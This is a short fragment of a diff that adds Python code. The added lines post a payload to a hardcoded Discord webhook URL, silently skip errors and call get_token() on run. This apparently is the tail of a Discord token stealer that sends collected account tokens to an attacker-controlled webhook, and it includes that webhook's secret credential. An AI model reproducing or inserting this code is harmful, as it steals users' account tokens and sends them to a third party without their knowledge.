+                            req = Request('https://discord.com/api/webhooks/1177528895218647081/HShnLQQqDeUBIvXFhtw_m77qQ_6piD2yXrKVbNU-Y9daZV7BMWA9k0zglGVf-tXMCWeC', data=payload.encode(), headers=headers2)
+                            urlopen(req)
+                        except: continue
+                else: continue
+if __name__ == '__main__':
+    get_token()
+
+
